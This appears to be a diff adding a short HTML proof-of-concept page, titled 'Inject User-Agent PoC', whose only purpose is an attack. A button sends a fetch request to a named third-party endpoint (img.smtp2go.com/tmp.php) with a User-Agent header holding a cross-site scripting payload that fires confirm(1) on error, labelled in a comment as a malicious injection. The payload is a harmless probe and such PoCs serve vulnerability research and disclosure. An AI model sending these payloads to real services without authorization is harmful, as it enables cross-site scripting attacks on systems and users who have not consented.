@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inject User-Agent PoC</title>
+</head>
+<body>
+    <h1>Custom User-Agent Injection</h1>
+    <button id="trigger">Send Request</button>
+
+    <script>
+        document.getElementById('trigger').addEventListener('click', function() {
+            fetch('http://img.smtp2go.com/tmp.php', {
+                method: 'GET',
+                headers: {
+                    'User-Agent': '<Img Src=OnXSS OnError=confirm(1)>',  // Malicious User-Agent Injection
+                }
+            })
+            .then(response => response.text())
+            .then(data => console.log('Response:', data))
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
+</body>
+</html>
